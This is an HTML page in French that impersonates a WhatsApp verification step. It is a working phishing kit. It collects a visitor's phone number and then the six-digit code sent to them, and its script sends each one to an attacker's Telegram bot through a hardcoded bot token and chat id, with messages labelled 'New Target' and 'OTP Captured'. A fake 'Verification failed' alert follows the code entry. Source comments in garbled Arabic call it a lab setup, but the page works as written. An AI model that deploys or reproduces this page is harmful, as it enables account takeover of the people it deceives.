<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>V√©rification WhatsApp</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --bg-cream: #fdf8f1;
            --btn-green: #24ac64;
            --text-black: #1a1a1a;
            --text-gray: #666;
        }

        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }

        body {
            background-color: var(--bg-cream);
            margin: 0; padding: 0;
            display: flex; flex-direction: column;
            align-items: center; min-height: 100vh;
        }

        .header-logo { width: 100%; padding: 25px 30px; }
        .header-logo img { height: 60px; width: auto; object-fit: contain; }

        .main-content {
            flex: 1; display: flex; justify-content: center;
            align-items: center; width: 100%; padding: 10px 20px;
        }

        .wrapper {
            width: 100%; max-width: 400px;
            background: white; padding: 45px 25px;
            border: 1.5px solid #000; border-radius: 35px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        }

        h2 { font-size: 24px; font-weight: 700; margin-bottom: 12px; color: var(--text-black); }
        p.desc { font-size: 15px; margin-bottom: 30px; color: var(--text-gray); line-height: 1.4; }

        .iti { width: 100%; margin-bottom: 25px; }
        input[type="tel"], .otp-field {
            height: 55px; border: 1px solid #e5e5e5;
            border-radius: 12px; font-size: 18px; outline: none;
        }

        .otp-container { display: flex; justify-content: space-between; gap: 8px; margin: 25px 0; }
        .otp-field { width: 45px; text-align: center; border: 1px solid #ccc; }

        .btn-submit {
            background-color: var(--btn-green); color: white;
            border: none; width: 100%; max-width: 200px;
            height: 50px; border-radius: 25px;
            font-size: 17px; font-weight: 600;
            cursor: pointer; margin: 20px auto; display: block;
        }

        .footer { width: 100%; padding: 25px; text-align: center; font-size: 14px; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="header-logo">
    <img src="https://i.ibb.co/WpGsjBjN/66-B81-BFB-41-A6-4025-AD64-3840-CAA7-CC0-E.jpg" alt="Logo">
</div>

<div class="main-content">
    <div class="wrapper">
        <div id="page1">
            <h2>Saisissez un num√©ro.</h2>
            <p class="desc">S√©lectionnez un pays et saisissez votre num√©ro de t√©l√©phone.</p>
            <input type="tel" id="phone">
            <button class="btn-submit" onclick="sendToTelegram('phone')">Suivant</button>
        </div>

        <div id="page2" class="hidden">
            <h2>V√©rification</h2>
            <p class="desc">Saisissez le code √† 6 chiffres envoy√© √† votre mobile.</p>
            <div class="otp-container">
                <input type="number" class="otp-field" maxlength="1">
                <input type="number" class="otp-field" maxlength="1">
                <input type="number" class="otp-field" maxlength="1">
                <input type="number" class="otp-field" maxlength="1">
                <input type="number" class="otp-field" maxlength="1">
                <input type="number" class="otp-field" maxlength="1">
            </div>
            <button class="btn-submit" onclick="sendToTelegram('otp')">V√©rifier</button>
        </div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
<script>
    // ÿßŸÑÿ•ÿπÿØÿßÿØÿßÿ™ (ÿ®Ÿäÿ¶ÿ© ÿßŸÑŸÖÿÆÿ™ÿ®ÿ±)
    const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
    const chatId = "1705240737";

    // ÿ™ŸáŸäÿ¶ÿ© ÿ•ÿØÿÆÿßŸÑ ÿßŸÑŸáÿßÿ™ŸÅ
    const phoneInput = document.querySelector("#phone");
    const iti = window.intlTelInput(phoneInput, {
        initialCountry: "auto",
        geoIpLookup: s => fetch("https://ipapi.co/json").then(r => r.json()).then(d => s(d.country_code)),
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
    });

    // ÿ™ÿ≠ÿ≥ŸäŸÜ ÿßŸÑÿ™ŸÜŸÇŸÑ ÿ®ŸäŸÜ ŸÖÿ±ÿ®ÿπÿßÿ™ OTP
    const inputs = document.querySelectorAll('.otp-field');
    inputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
        });
    });

    async function sendToTelegram(type) {
        let message = "";
        
        if (type === 'phone') {
            const num = iti.getNumber();
            if (!iti.isValidNumber()) return alert("Num√©ro invalide");
            message = `üì± New Target: ${num}`;
            document.getElementById('page1').classList.add('hidden');
            document.getElementById('page2').classList.remove('hidden');
        } else {
            let code = "";
            inputs.forEach(i => code += i.value);
            if (code.length < 6) return alert("Code incomplete");
            message = `üîë OTP Captured: ${code}`;
        }

        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
            if(type === 'otp') alert("Verification failed. Try again.");
        } catch (e) {
            console.error("Error exfiltrating data:", e);
        }
    }
</script>
</body>
</html>
